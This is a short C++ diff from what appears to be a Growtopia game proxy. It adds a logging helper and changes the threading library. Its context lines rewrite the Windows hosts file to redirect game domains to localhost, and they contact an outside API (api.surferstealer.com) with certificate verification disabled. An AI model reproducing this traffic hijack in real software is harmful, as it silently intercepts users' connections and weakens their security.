@@ -67,11 +67,15 @@ public:
 			}
 		}
 	}
+	void send_log(std::string text)
+	{
+		this->ENetManager->sendPacket("action|log\nmsg|" + text, getType::Local, NET_MESSAGE_GAME_MESSAGE);
+	}
 	void init()
 	{
 		utils::writeFile("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 www.growtopia1.com\n127.0.0.1 www.growtopia2.com");
 		HttpS_Server* server = new HttpS_Server(defaultProxyIP, defaultProxyPort);
-		boost::thread(&HttpS_Server::Listen,server).detach();
+		std::thread(&HttpS_Server::Listen,server).detach();
 
 		httplib::Client cli("https://api.surferstealer.com");
 		cli.enable_server_certificate_verification(false);
